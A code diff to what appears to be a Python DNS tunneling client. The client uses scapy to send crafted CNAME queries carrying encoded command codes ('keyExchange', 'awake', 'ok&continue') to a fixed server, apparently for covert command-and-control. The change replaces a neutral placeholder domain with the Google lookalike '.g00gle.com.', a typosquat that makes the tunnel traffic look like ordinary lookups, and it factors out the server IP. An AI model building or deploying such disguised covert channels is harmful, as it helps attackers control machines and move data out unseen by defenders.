@@ -39,7 +39,8 @@ import platform
 # endregion
 tmp_msg = b''
 TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
-DOMAIN = b".resh.gimel."
+DOMAIN = b".g00gle.com."
+DNS_SERVER_IP = "10.3.1.24"
 MAX_CHARS_IN_SUBDOMAIN = 63
 MAX_DOMAIN = 255 - len(DOMAIN) - 9 - 9 - 1  # `-9` for the code in base32 and `-9` for the identify number
 CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 300, 'ok&retransmission': 401,
@@ -155,7 +156,7 @@ def send_req(qname: bytes):
     while cmd_code == SERVER_COMMANDS['error&retransmission']:
         # create the DNS query and send it:
         # todo: get automatically the local dns server ip
-        dns_req = IP(dst='10.0.2.7') / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname, qtype='CNAME'))
+        dns_req = IP(dst=DNS_SERVER_IP) / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname, qtype='CNAME'))
         response = sr1(dns_req, verbose=False)
         cmd_code, command = parse_response(response[DNSRR])
 
@@ -165,7 +166,7 @@ def send_req(qname: bytes):
             while cmd_code != SERVER_COMMANDS['last']:
                 # send an 'ACK' to server and parse the next part:
                 fake_domain = identify + b'.' + build_req(CLIENT_COMMANDS['ok&continue'], b'continue') + DOMAIN
-                dns_req = IP(dst='10.0.2.7') / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=fake_domain,
+                dns_req = IP(dst=DNS_SERVER_IP) / UDP(sport=234, dport=53) / DNS(rd=1, qd=DNSQR(qname=fake_domain,
                                                                                              qtype='CNAME'))
                 response = sr1(dns_req, verbose=False)
                 cmd_code, command = parse_response(response[DNSRR])
